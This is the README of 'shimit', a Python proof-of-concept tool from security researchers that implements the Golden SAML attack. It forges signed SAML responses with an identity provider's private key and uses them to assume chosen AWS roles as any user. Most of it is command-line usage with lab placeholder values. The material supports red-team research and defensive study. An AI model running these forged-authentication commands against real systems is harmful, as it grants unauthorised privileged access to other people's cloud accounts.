# shimit

`shimit` is a python tool that implements the Golden SAML attack. More informations on this can be found in the following [article](https://www.cyberark.com/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps) on our blog.

```
python .\shimit.py -h
usage: shimit.py [-h] -pk KEY [-c CERT] [-sp SP] -idp IDP -u USER [-reg REGION]
                 [--SessionValidity SESSION_VALIDITY] [--SamlValidity SAML_VALIDITY] -n SESSION_NAME
                 -r ROLES -id ARN [-o OUT_FILE] [-l LOAD_FILE] [-t TIME]
                 
              ██╗   ███████╗██╗  ██╗██╗███╗   ███╗██╗████████╗     ██╗ ██╗  
             ██╔╝   ██╔════╝██║  ██║██║████╗ ████║██║╚══██╔══╝    ██╔╝ ╚██╗ 
            ██╔╝    ███████╗███████║██║██╔████╔██║██║   ██║      ██╔╝   ╚██╗
            ╚██╗    ╚════██║██╔══██║██║██║╚██╔╝██║██║   ██║     ██╔╝    ██╔╝
             ╚██╗   ███████║██║  ██║██║██║ ╚═╝ ██║██║   ██║    ██╔╝    ██╔╝ 
              ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝   ╚═╝    ╚═╝     ╚═╝  
```
## Overview
In a golden SAML attack, attackers can gain access to an application (any application that supports SAML authentication) with any privileges they desire and be any user on the targeted application.

*shimit* allows the user to create a signed _SAMLResponse_ object, and use it to open a session in the Service Provider. *shimit* now supports AWS Console as a _Service Provider_, more are in the works...
### AWS 
After generating and signing the _SAMLResponse_'s _assertion_, shimit will call the _AssumeRoleWithSAML()_ API in AWS. Then, the session token and key will be applied to a new session, where the user can use aws cli to perform action using the permissions obtained using the *golden SAML*. 

## Requirements:
For installing the required modules, run the following command:

```
python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml
```
### AWS cli ###
Needs to be installed in order to use the credentials obtained.
Can be downloaded for [Windows](http://docs.aws.amazon.com/cli/latest/userguide/awscli-install-windows.html) or
[Linux](http://docs.aws.amazon.com/cli/latest/userguide/awscli-install-linux.html)
from these links.


## Usage:


### Apply session for AWS cli
```
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file
-u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
```
**idp** - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust

**pk**  - Private key file full path (pem format)

**c**   - Certificate file full path (pem format)

**u**   - User and domain name e.g. domain\username (use \\ or quotes in *nix)

**n**   - Session name in AWS

**r**   - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.

**id**  - AWS account id e.g. 123456789012



### Save SAMLResponse to file
```
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file
-u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
**o**  - Output encoded SAMLResponse to a specified file path
### Load SAMLResponse from file
```
python .\shimit.py -l saml_response.xml
```
**l**  - Load SAMLResponse from a specified file path

## Contributions

`shimit` supports AWS as a service provider at the moment, as a POC. We highly encourage you to conribute with a new modules for other service providers. 